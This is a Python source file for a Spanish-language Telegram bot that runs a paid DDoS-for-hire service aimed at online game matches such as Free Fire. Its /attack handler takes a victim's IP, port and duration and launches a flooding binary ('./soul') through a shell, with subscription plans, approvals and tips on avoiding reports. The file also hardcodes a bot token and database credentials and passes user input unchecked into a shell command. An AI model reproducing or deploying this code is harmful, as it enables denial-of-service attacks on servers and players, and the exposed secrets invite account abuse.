import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from subprocess import Popen
from threading import Thread
import asyncio
import aiohttp
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.get_event_loop()

TOKEN = '7987563641:AAEkQcErl3bFlpSy8ozDq7DcrZgp3SpF7yE'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002156421934
CHANNEL_ID = -1002156421934
error_channel_id = -1002156421934

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['zoya']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list

async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

def update_proxy():
    proxy_list = [
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "El proxy ha sido actualizado correctamente.")
    except Exception as e:
        bot.send_message(chat_id, f"Error al actualizar el proxy: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 10")
    await process.communicate()
    bot.attack_in_progress = False

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*🚫 Acceso Denegado!*\n"
                                   "*No tienes permiso para ejecutar este comando.*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*⚠️ ¡Espera! Formato de comando no válido.*\n"
                                   "*Please use one of the following commands:*\n"
                                   "*1. /approve <user_id> <plan> <days>*\n"
                                   "*2. /disapprove <user_id>*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    target_username = message.reply_to_message.from_user.username if message.reply_to_message else None
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        if plan == 1:  # Instant Plan 🧡
            if users_collection.count_documents({"plan": 1}) >= 99:
                bot.send_message(chat_id, "*🚫 Error de aprobación: límite del Plan instantáneo 🧡 alcanzado (99 usuarios).*", parse_mode='Markdown')
                return
        elif plan == 2:  # Instant++ Plan 💥
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(chat_id, "*🚫 Error de aprobación: se alcanzó el límite del Plan Instant++ 💥 (499 usuarios).*", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"user_id": target_user_id, "username": target_username, "plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = (f"*🎉 Congratulations!*\n"
                    f"*Usuario {target_user_id} ha sido aprobado!*\n"
                    f"*Plan: {plan} por {days} dias!*\n"
                    f"*Welcome to our community! Let’s make some magic happen! ✨*")
    else:  # disapprove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = (f"*❌ Aviso de desaprobación!*\n"
                    f"*Usuarior {target_user_id} ha sido desaprobado.*\n"
                    f"*Ellos han sido revertidos al plan gratuito.*\n"
                    f"*¡Anímelos a intentarlo de nuevo pronto! 🍀*")

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')



# Initialize attack flag, duration, and start time
bot.attack_in_progress = False
bot.attack_duration = 0  # Store the duration of the ongoing attack
bot.attack_start_time = 0  # Store the start time of the ongoing attack

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Acceso Denegado!*\n"  # Access Denied message
                                       "*Necesitas ser aprobado para poder utilizar este bot.*\n"  # Need approval message
                                       "*Contacta al dueño: @xFernandoh.*", parse_mode='Markdown')  # Contact owner message
            return

        # Check plan limits
        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, "*🧡 Instant Plan esta completamente lleno!* \n"  # Instant Plan full message
                                       "*Considera comprar un plan VIP para que tengas mayor prioridad.*", parse_mode='Markdown')  # Upgrade message
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, "*💥 Instant++ Plan esta completamente lleno!* \n"  # Instant++ Plan full message
                                       "*Considera comprar un plan o sigue esperando.*", parse_mode='Markdown')  # Upgrade message
            return

        if bot.attack_in_progress:
            bot.send_message(chat_id, "*⚠️ Por favor espera!*\n"  # Busy message
                                       "*El bot está ocupado con otro ataque..*\n"  # Current attack message
                                       "*Verifique el tiempo restante con el comando /when.*", parse_mode='Markdown')  # Check remaining time
            return

        bot.send_message(chat_id, "*💣 Preparado para subir el ping?*\n"  # Ready to launch message
                                   "*Proporcione la IP de la partida, y la duración en segundos.*\n"  # Provide details message
                                   "*Ejemplo 148.153.168.181:10015* 🔥\n"  # Example message
                                   "*Que comience el caos! 🎉*", parse_mode='Markdown')  # Start chaos message
        bot.register_next_step_handler(message, process_attack_command)

    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*❗ Error!*\n"  # Error message
                                               "*Por favor usa el tipo de comando correcto y intenta de nuevo.*\n"  # Correct format message
                                               "*Asegurate de proporcionar bien la IP! 🔄*", parse_mode='Markdown')  # Three inputs message
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*🔒 Puerto {target_port} esta bloqueado.*\n"  # Blocked port message
                                               "*Por favor selecciona otro puerto para poder seguir.*", parse_mode='Markdown')  # Different port message
            return
        if duration >= 600:
            bot.send_message(message.chat.id, "*⏳ Duración máxima en segundos es 599.*\n"  # Duration limit message
                                               "*Por favor pon una duración mas corta e inténtalo de nuevo!*", parse_mode='Markdown')  # Shorten duration message
            return  

        bot.attack_in_progress = True  # Mark that an attack is in progress
        bot.attack_duration = duration  # Store the duration of the ongoing attack
        bot.attack_start_time = time.time()  # Record the start time

        # Start the attack
        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*🚀 Attack Launched! 🚀*\n\n"  # Attack launched message
                                           f"*📡 Host Afectado: {target_ip}*\n"  # Target host message
                                           f"*👉 Puerto Afectado: {target_port}*\n"  # Target port message
                                           f"*⏰ Duración: {duration} segundos! Que comience la diversión! 🔥*", parse_mode='Markdown')  # Duration message

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")





def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['when'])
def when_command(message):
    chat_id = message.chat.id
    if bot.attack_in_progress:
        elapsed_time = time.time() - bot.attack_start_time  # Calculate elapsed time
        remaining_time = bot.attack_duration - elapsed_time  # Calculate remaining time

        if remaining_time > 0:
            bot.send_message(chat_id, f"*⏳ Tiempo Restante: {int(remaining_time)} segundos...*\n"
                                       "*🔍 ¡Agárrate fuerte, la acción aún se está desarrollando!*\n"
                                       "*💪 Mantente actualizado sobre las siguientes actualizaciones!*", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "*🎉 El ataque ha sido exitoso!*\n"
                                       "*🚀 You can now launch your own attack and showcase your skills!*", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*❌ Actualmente no hay ningún ataque en curso.*\n"
                                   "*🔄 ¡Siéntete libre de iniciar tu ataque cuando estés listo!*", parse_mode='Markdown')


@bot.message_handler(commands=['myinfo'])
def myinfo_command(message):
    user_id = message.from_user.id
    user_data = users_collection.find_one({"user_id": user_id})

    if not user_data:
        # User not found in the database
        response = "*❌ Oops! No he encontrado ningúna cuenta!* \n"  # Account not found message
        response += "*Para asistencia contacte a: @xFernandoh* "  # Contact owner message
    elif user_data.get('plan', 0) == 0:
        # User found but not approved
        response = "*🔒 Tu cuenta esta esperando a se aprovada!* \n"  # Not approved message
        response += "*Please reach out to the owner for assistance: @xFernandoh* 🙏"  # Contact owner message
    else:
        # User found and approved
        username = message.from_user.username or "Unknown User"  # Default username if none provided
        plan = user_data.get('plan', 'N/A')  # Get user plan
        valid_until = user_data.get('valid_until', 'N/A')  # Get validity date
        current_time = datetime.now().isoformat()  # Get current time
        response = (f"*👤 USERNAME: @{username}* \n"  # Username
                    f"*💸 PLAN: {plan}* \n"  # User plan
                    f"*⏳ VALIDO HASTA: {valid_until}* \n"  # Validity date
                    f"*⏰ HORA ACTUAL: {current_time}* \n"  # Current time
                    f"*🌟¡Gracias por ser una parte importante de nuestra comunidad! Si tienes alguna pregunta o necesitas ayuda, ¡solo pregunta! ¡Estamos aquí para ayudarte!* 💬🤝")  # Community message

    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['rules'])
def rules_command(message):
    rules_text = (
        "*📜 Reglas del Bot - Sientete Insano!\n\n"
        "1. No spammear ataques! ⛔ \nRest for 5-6 matches between DDOS.\n\n"
        "2. No mates mucha gente! 🔫 \nMantente entre 6-10 kills para que sea equitativo.\n\n"
        "3. Jugar inteligentemente! 🎮 \nAvoid reports and stay low-key.\n\n"
        "4. No usar archivos! 🚫 \nSi usas archivos en Free Fire puedes ser baneado.\n\n"
        "5. Be respectful! 🤝 \nKeep communication friendly and fun.\n\n"
        "6. Reporta Bugs! 🛡️ \nMessage Al dueño por cualquier inconveniente.\n\n"
        "💡 Sigue las reglas y tendrás muy buena diversión!*"
    )

    try:
        bot.send_message(message.chat.id, rules_text, parse_mode='Markdown')
    except Exception as e:
        print(f"Error while processing /rules command: {e}")

    except Exception as e:
        print(f"Error while processing /rules command: {e}")


@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = ("*🌟 Bienvenido al centro de comandos!*\n\n"
                 "*Esto es lo que puedes hacer:* \n"
                 "1. *`/attack` - ⚔️ Lanzar un ataque a tu partida!*\n"
                 "2. *`/myinfo` - 👤 La información de tu cuenta para que sigas informado.*\n"
                 "3. *`/owner` - 📞 Contacta eñal dueño del puto bot alaverga!*\n"
                 "4. *`/when` - ⏳ Quieres saber el status del bot? Descubrelo ahora!*\n"
                 "5. *`/canary` - 🦅 Obtenga la última versión de Canary para disfrutar de funciones de vanguardia.*\n"
                 "6. *`/rules` - 📝 Las reglas para que tenga un juego limpio y justo.*\n\n"
                 "*💡  ¿Tienes preguntas? ¡No dudes en preguntar! ¡Su satisfacción es nuestra prioridad!*")

    try:
        bot.send_message(message.chat.id, help_text, parse_mode='Markdown')
    except Exception as e:
        print(f"Error while processing /help command: {e}")



@bot.message_handler(commands=['owner'])
def owner_command(message):
    response = (
        "*👤 **Información del dueño:**\n\n"
        "Para cualquier consulta, soporte u oportunidad de colaboración, no dude en comunicarse con el propietario:\n\n"
        "📩 **Telegram:** @xFernandoh\n\n"
        "💬 **Valoramos tus comentarios!** Sus pensamientos y sugerencias son cruciales para mejorar nuestro servicio y mejorar tu experiencia.\n\n"
        "🌟 **Gracias por ser parte de nuestra comunidad** ¡Tu apoyo significa mucho para nosotros y siempre estamos aquí para ayudar!*\n"
    )
    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_message(message):
    try:
        bot.send_message(message.chat.id, "*🌍 Bienvenido al mundo del DDoS!* 🎉\n\n"
                                           "*🚀 Estas listo para la acción!*\n\n"
                                           "*💣 Para desatar el poder, usa el comando* `/attack` *Seguido por la IP y puertos que deseas afectar.* ⚔️\n\n"
                                           "*🔍 Ejemplo: Pones* `/attack`, *enter:* `IP puerto y duración en segundos`.\n\n"
                                           "*🔥 Ensure your target is locked in before you strike!*\n\n"
                                           "*📚 Eres nuevo aquí? Usa el comando* `/help` *para descubrir todo lo que puedes hacer.* 📜\n\n"
                                           "*⚠️ Recuerde, ¡un gran poder conlleva una gran responsabilidad! Úsalo sabiamente... ¡o deja que reine el caos!* 😈💥", 
                                           parse_mode='Markdown')
    except Exception as e:
        print(f"Error while processing /start command: {e}")


if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
